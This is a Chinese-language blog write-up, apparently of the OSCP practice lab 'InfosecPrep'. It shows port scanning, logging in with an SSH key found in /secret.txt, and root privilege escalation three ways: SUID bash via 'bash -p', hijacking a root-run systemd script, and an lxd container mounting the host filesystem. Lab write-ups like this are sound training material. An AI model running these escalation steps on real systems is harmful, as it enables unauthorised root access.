@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="信息收集端口信息 123456789101112131415PORT      STATE    SERVICE0&#x2F;tcp     filtered unknown22&#x2F;tcp    open     ssh| ssh-hostkey: |   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)|   256 0f:35:d1:a1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCPLab-InfosecPrep">
+<meta property="og:url" content="http://example.com/2024/04/15/OSCPLab-InfosecPrep/index.html">
+<meta property="og:site_name" content="B00ze Escape">
+<meta property="og:description" content="信息收集端口信息 123456789101112131415PORT      STATE    SERVICE0&#x2F;tcp     filtered unknown22&#x2F;tcp    open     ssh| ssh-hostkey: |   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)|   256 0f:35:d1:a1">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-15T02:09:59.000Z">
+<meta property="article:modified_time" content="2024-04-15T02:12:24.805Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Labs">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>OSCPLab-InfosecPrep</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/04/15/OSCPLab-PyExp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/04/13/Linux%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/15/OSCPLab-InfosecPrep/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&text=OSCPLab-InfosecPrep"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&is_video=false&description=OSCPLab-InfosecPrep"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OSCPLab-InfosecPrep&body=Check out this article: http://example.com/2024/04/15/OSCPLab-InfosecPrep/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&name=OSCPLab-InfosecPrep&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&t=OSCPLab-InfosecPrep"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">利用suid提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">利用服务提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8lxd-lxc%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text">利用lxd&#x2F;lxc提权</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        OSCPLab-InfosecPrep
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-15T02:09:59.000Z" class="dt-published" itemprop="datePublished">2024-04-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Labs/" rel="tag">Labs</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE    SERVICE</span><br><span class="line">0/tcp     filtered unknown</span><br><span class="line">22/tcp    open     ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)</span><br><span class="line">|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)</span><br><span class="line">|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)</span><br><span class="line">80/tcp    open     http</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/secret.txt</span><br><span class="line">|_http-generator: WordPress 5.4.2</span><br><span class="line">7221/tcp  filtered unknown</span><br><span class="line">10330/tcp filtered unknown</span><br><span class="line">33060/tcp open     mysqlx</span><br><span class="line">63495/tcp filtered unknown</span><br></pre></td></tr></table></figure>
+
+<p>可以看到是一个wp的站点，在&#x2F;robots.txt中发现有一个&#x2F;secret.txt</p>
+<p>访问&#x2F;secret.txt，发现是一串编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LS0...WS0tLS0tCg==</span><br></pre></td></tr></table></figure>
+
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>挂上wpscan，发现版本是5.4.2，并且有&#x2F;xmlrpc.php目录</p>
+<p>没搜到5.4.2的洞，再返回来看secret.txt的内容，猜测是base64编码的，解码之后发现是SSH的私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1r...zY3A=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>尝试指定私钥登录服务器，但是没成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i sec root@192.168.212.89</span><br></pre></td></tr></table></figure>
+
+<p>这时没办法了，正在去看主页内容的时候，发现这样一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oh yea! Almost forgot the only user on this box is “oscp”. </span><br></pre></td></tr></table></figure>
+
+<p>尝试使用oscp用户去登录服务器，成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i sec oscp@192.168.212.89</span><br></pre></td></tr></table></figure>
+
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>看了一下内核版本是linux 5.4.0-40-generic，开始试了一下CVE-2021-22555本地提权的方法，结果提示目标机器上把依赖so文件给删了</p>
+<p>这时在目录下的ip文件中发现是一个shell脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ cat ip</span><br><span class="line">#!/bin/sh</span><br><span class="line">cp /etc/issue-standard /etc/issue</span><br><span class="line">/usr/local/bin/get-ip-address &gt;&gt; /etc/issue</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用suid提权"><a href="#利用suid提权" class="headerlink" title="利用suid提权"></a>利用suid提权</h3><p>查找suid常用的三条命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p>找到&#x2F;usr&#x2F;bin&#x2F;bash命令</p>
+<p>在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E4%B8%8A%E6%9F%A5%E6%89%BE%EF%BC%8C%E5%8F%91%E7%8E%B0%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C">https://gtfobins.github.io/上查找，发现直接运行</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+
+<p>就能临时转换成为root权限</p>
+<h3 id="利用服务提权"><a href="#利用服务提权" class="headerlink" title="利用服务提权"></a>利用服务提权</h3><p>上面看到了在用户目录下有个ip文件，现在在机器上搜索一下这个文件在&#x2F;etc下的哪里被调用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;/home/oscp/ip&quot; /etc/</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/systemd/system/ip-update.service:ExecStart=/home/oscp/ip</span><br></pre></td></tr></table></figure>
+
+<p>查看ip-update.service内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Write current ip addr to /etc/issue[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">RemainAfterExit=true</span><br><span class="line">ExecStart=/home/oscp/ip[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<p>然后把ip的文件的内容给改了就行了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">cp /root/flag.txt /home/oscp/flag.txt</span><br><span class="line">chown oscp:oscp /home/oscp/flag.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用lxd-lxc提权"><a href="#利用lxd-lxc提权" class="headerlink" title="利用lxd&#x2F;lxc提权"></a>利用lxd&#x2F;lxc提权</h3><p>执行id的时候发现用户属于lxd组</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ id</span><br><span class="line">uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>
+
+<p>然后下载lxd-alpine-builder存储库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder/</span><br><span class="line">./build-alpine</span><br><span class="line">ls</span><br><span class="line">alpine-v3.12-x86_64-20200719_2153.tar.gz  build-alpine  LICENSE  README.md</span><br></pre></td></tr></table></figure>
+
+<p>然后将alpine-v3.12-x86_64-20200719_2153.tar.gz传到目标机器上</p>
+<p>默认lxc不在默认的bin目录下，需要找到命令在哪里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ find / -name lxc &gt; lxcsearch.txt</span><br><span class="line">-bash-5.0$ head lxcsearch.txt</span><br><span class="line">/snap/lxd/16100/bin/lxc</span><br><span class="line">/snap/lxd/16100/commands/lxc</span><br><span class="line">/snap/lxd/16100/lxc</span><br><span class="line">/snap/lxd/16044/bin/lxc</span><br><span class="line">/snap/lxd/16044/commands/lxc</span><br><span class="line">/snap/lxd/16044/lxc</span><br><span class="line">/snap/bin/lxc</span><br><span class="line">/usr/share/bash-completion/completions/lxc</span><br><span class="line">/etc/bash_completion.d/lxc</span><br><span class="line">/home/oscp/snap/lxd/16100/.config/lxc</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;snap&#x2F;bin&#x2F;lxc是我们需要使用的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc image import ./alpine-v3.12-x86_64-20200719_2153.tar.gz --alias trenchesofit</span><br><span class="line">Image imported with fingerprint: e279d5bc0806b79884c8a0cf7952c86a53d9da5a23b7e13ee75b42628118b8f9</span><br><span class="line">-bash-5.0$ /snap/bin/lxc image list</span><br><span class="line">+--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+</span><br><span class="line">|    ALIAS     | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |          UPLOAD DATE          |</span><br><span class="line">+--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+</span><br><span class="line">| trenchesofit | e279d5bc0806 | no     | alpine v3.12 (20200719_21:53) | x86_64       | CONTAINER | 3.04MB | Jul 22, 2020 at 11:59pm (UTC) |</span><br><span class="line">+--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>创建存储池并分配存储位置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc storage create pool dir</span><br><span class="line">Storage pool pool created</span><br><span class="line">-bash-5.0$ /snap/bin/lxc profile device add default root disk path=/ pool=pool</span><br><span class="line">Device root added to default</span><br><span class="line">-bash-5.0$ /snap/bin/lxc storage list</span><br><span class="line">+------+-------------+--------+---------------------------------------------+---------+</span><br><span class="line">| NAME | DESCRIPTION | DRIVER |                   SOURCE                    | USED BY |</span><br><span class="line">+------+-------------+--------+---------------------------------------------+---------+</span><br><span class="line">| pool |             | dir    | /var/snap/lxd/common/lxd/storage-pools/pool | 1       |</span><br><span class="line">+------+-------------+--------+---------------------------------------------+---------+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc init trenchesofit ignite -c security.privileged=true</span><br><span class="line">Creating ignite</span><br><span class="line">                                          </span><br><span class="line">The instance you are starting doesn&#x27;t have any network attached to it.</span><br><span class="line">  To create a new network, use: lxc network create</span><br><span class="line">  To attach a network to an instance, use: lxc network attach</span><br></pre></td></tr></table></figure>
+
+<p>将目标机器的文件系统挂载并启动</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true</span><br><span class="line">Device trenches added to ignite</span><br><span class="line">-bash-5.0$ /snap/bin/lxc start ignite</span><br></pre></td></tr></table></figure>
+
+<p>然后在容器中运行bash，得到root权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc exec ignite /bin/sh</span><br><span class="line">~ # </span><br><span class="line">~ # id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>root的文件在&#x2F;mnt&#x2F;root下</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">利用suid提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">利用服务提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8lxd-lxc%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text">利用lxd&#x2F;lxc提权</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/15/OSCPLab-InfosecPrep/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&text=OSCPLab-InfosecPrep"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&is_video=false&description=OSCPLab-InfosecPrep"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OSCPLab-InfosecPrep&body=Check out this article: http://example.com/2024/04/15/OSCPLab-InfosecPrep/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&title=OSCPLab-InfosecPrep"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&name=OSCPLab-InfosecPrep&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/15/OSCPLab-InfosecPrep/&t=OSCPLab-InfosecPrep"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2010-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
